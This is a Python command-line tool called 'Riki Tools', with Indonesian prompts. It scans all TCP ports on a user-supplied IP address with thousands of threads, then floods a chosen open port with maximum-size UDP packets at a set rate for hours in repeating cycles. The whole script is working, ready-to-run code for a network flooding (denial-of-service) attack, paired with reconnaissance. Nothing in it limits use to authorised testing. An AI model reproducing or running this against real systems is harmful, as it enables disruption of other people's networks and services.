#!/usr/bin/python3

import subprocess
import sys
import os

# ========== AUTO INSTALL LIBRARY ==========
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_libraries = ["pyfiglet", "tqdm", "termcolor"]
for library in required_libraries:
    try:
        __import__(library)
    except ImportError:
        install(library)

import socket
import pyfiglet
from tqdm import tqdm
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import signal

# ========== PORT SCANNER (TCP) ==========
def portScanner(args):
    ip, port, timeout = args
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            result = s.connect_ex((ip, port))
            if result == 0:
                return port
        except:
            pass
    return None

def scan_ports(target_ip, port_min=2, port_max=65000, timeout=0.5):
    logo_text = pyfiglet.figlet_format("Port Scanner")
    print(logo_text)
    print(colored(f"Scanning {target_ip} ports {port_min}-{port_max}...", "yellow"))
    open_ports = []
    tasks = [(target_ip, port, timeout) for port in range(port_min, port_max+1)]

    max_workers = os.cpu_count() * 2000
    print(colored(f"Using {max_workers} threads for fast scanning!", "cyan"))
    pbar = tqdm(total=len(tasks), ncols=70, unit="port")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_port = {executor.submit(portScanner, task): task[1] for task in tasks}
        for future in as_completed(future_to_port):
            pbar.update(1)
            port = future_to_port[future]
            try:
                result = future.result()
                if result:
                    print(colored(f"Port {result} is OPEN", "green"))
                    open_ports.append(result)
            except Exception as exc:
                pass

    pbar.close()
    return open_ports

# ========== SCHEDULER UDP TRAFFIC GENERATOR ==========
def udp_worker(target_ip, target_port, packet, sleep_per_packet, stop_signal, data_counter):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while not stop_signal["stop"]:
            sock.sendto(packet, (target_ip, target_port))
            data_counter["sent"] += len(packet)
            if sleep_per_packet > 0:
                time.sleep(sleep_per_packet)
    except Exception as e:
        print(f"UDP Error: {str(e)}")
    finally:
        sock.close()

def run_traffic_cycle(target_ip, target_port, num_threads, target_rate_mbps, run_time, total_seconds, start_time, stop_signal, data_counter):
    animation = "|/-\\"
    packet = b"A" * 65507
    target_rate_bps = target_rate_mbps * 1_000_000
    target_rate_Bps = target_rate_bps // 8
    packet_size = len(packet)
    packets_per_sec_total = target_rate_Bps // packet_size
    if packets_per_sec_total == 0:
        packets_per_sec_total = 1
    packets_per_thread = max(1, packets_per_sec_total // num_threads)
    sleep_per_packet = 1.0 / packets_per_thread if packets_per_thread else 0

    local_stop = {"stop": False}
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=udp_worker, args=(target_ip, target_port, packet, sleep_per_packet, local_stop, data_counter))
        t.daemon = True
        t.start()
        threads.append(t)

    i = 0
    cycle_start = time.time()
    try:
        while not stop_signal["stop"]:
            now = time.time()
            elapsed = now - start_time
            cycle_elapsed = now - cycle_start
            if total_seconds > 0 and elapsed >= total_seconds:
                stop_signal["stop"] = True
                break
            if cycle_elapsed >= run_time:
                break
            sys.stdout.write(
                f"\r{animation[i % len(animation)]} Data sent: {data_counter['sent']/(1024*1024):.2f} MB | Total: {int(elapsed)//60}m {int(elapsed)%60}s | Cycle: {int(cycle_elapsed)//60}m {int(cycle_elapsed)%60}s"
            )
            sys.stdout.flush()
            i += 1
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop_signal["stop"] = True

    local_stop["stop"] = True
    for t in threads:
        t.join()

# ========== MAIN PROGRAM ==========
def get_int_input(prompt, default):
    try:
        val = int(input(f"{prompt} (default {default}): ") or default)
        return val
    except ValueError:
        print("Input tidak valid, gunakan default.")
        return default

def menu():
    print("\n========== PILIH AKSI ==========")
    print("1. Scan Port saja")
    print("2. Scan Port lalu lanjut Kirim Paket UDP ke port pilihan")
    print("0. Keluar")
    while True:
        pilih = input("Masukkan pilihan (1/2/0): ")
        if pilih in ["1", "2", "0"]:
            return pilih
        else:
            print("Input tidak valid, masukkan 1, 2, atau 0.")

def main():
    print(pyfiglet.figlet_format("Riki Tools"))
    target_ip = input("Masukkan alamat IP target (default 127.0.0.1): ") or "127.0.0.1"
    aksi = menu()
    if aksi == "0":
        print("Keluar.")
        return

    open_ports = scan_ports(target_ip, 2, 65000)
    if not open_ports:
        print(colored("Tidak ada port terbuka ditemukan. Keluar.", "red"))
        return

    print(colored("\nPORT TERBUKA:", "yellow"))
    for idx, port in enumerate(open_ports):
        print(f"{idx+1}. {port}")

    if aksi == "1":
        print("\nScan selesai. Tidak lanjut kirim paket.\n")
        return

    # Pilihan 2: lanjut kirim paket
    while True:
        pilih = input("Pilih port yang akan digunakan untuk traffic UDP (input nomor): ")
        try:
            pilih_idx = int(pilih)-1
            if 0 <= pilih_idx < len(open_ports):
                target_port = open_ports[pilih_idx]
                break
            else:
                print("Nomor salah.")
        except:
            print("Input tidak valid.")

    num_threads = get_int_input("Masukkan jumlah thread", os.cpu_count() * 2)
    target_rate_mbps = get_int_input("Masukkan target traffic (Mbps)", 100)
    durasi_jam = get_int_input("Berapa JAM script dijalankan", 0)
    durasi_menit = get_int_input("Berapa MENIT script dijalankan", 1)
    cycle_run_seconds = 1 * 3600          # 1 jam
    cycle_pause_seconds = 15 * 60         # 15 menit
    total_seconds = durasi_jam * 3600 + durasi_menit * 60

    stop_signal = {"stop": False}
    data_counter = {"sent": 0}

    def signal_handler(sig, frame):
        stop_signal["stop"] = True
        print("\nSIGINT received, stopping...")

    signal.signal(signal.SIGINT, signal_handler)

    print(colored(f"\nMulai kirim traffic UDP ke {target_ip}:{target_port}\n", "cyan"))
    start_time = time.time()
    elapsed = 0
    cycle_num = 1

    try:
        while not stop_signal["stop"] and (total_seconds == 0 or elapsed < total_seconds):
            print(f"\n=== CYCLE {cycle_num}: TRAFFIC ON ===")
            sisa_waktu = total_seconds - elapsed if total_seconds > 0 else cycle_run_seconds
            this_cycle = min(cycle_run_seconds, sisa_waktu)
            run_traffic_cycle(
                target_ip, target_port, num_threads, target_rate_mbps,
                this_cycle, total_seconds, start_time, stop_signal, data_counter
            )
            if stop_signal["stop"]:
                break
            elapsed = time.time() - start_time
            if total_seconds > 0 and elapsed >= total_seconds:
                break
            print(f"\n=== CYCLE {cycle_num}: PAUSE 15 MENIT ===")
            pause_time = min(cycle_pause_seconds, (total_seconds - elapsed) if total_seconds > 0 else cycle_pause_seconds)
            for s in range(int(pause_time)):
                if stop_signal["stop"]:
                    break
                sys.stdout.write(f"\rPause... {int(pause_time)-s} detik tersisa")
                sys.stdout.flush()
                time.sleep(1)
            elapsed = time.time() - start_time
            cycle_num += 1

    except KeyboardInterrupt:
        stop_signal["stop"] = True

    elapsed_time = time.time() - start_time
    print(f"\nSelesai!\nData sent: {data_counter['sent']} bytes")
    print(f"Time elapsed: {elapsed_time:.2f} seconds")
    print(f"Data rate: {data_counter['sent'] / elapsed_time / (1024*1024):.2f} MB/s")
    print(f"Data rate: {8 * data_counter['sent'] / elapsed_time / (1024*1024):.2f} Mbps")

if __name__ == "__main__":
    main()
